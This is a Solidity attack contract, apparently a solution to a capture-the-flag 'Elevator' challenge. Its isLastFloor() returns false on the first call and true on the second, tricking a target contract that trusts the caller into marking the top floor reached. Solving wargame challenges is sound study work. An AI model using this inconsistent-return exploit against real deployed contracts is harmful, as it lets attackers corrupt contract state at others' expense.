// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack {
    IElevator public target;
    bool private called; // toggle flag

    constructor(address _target) {
        target = IElevator(_target);
        called = false;
    }

    function isLastFloor(uint256) external returns (bool) {
        if (!called) {
            called = true;
            return false; // First call: false -> if 진입
        } else {
            return true;  // Second call: true -> top = true
        }
    }

    function attack(uint256 _floor) external {
        target.goTo(_floor);
    }
}
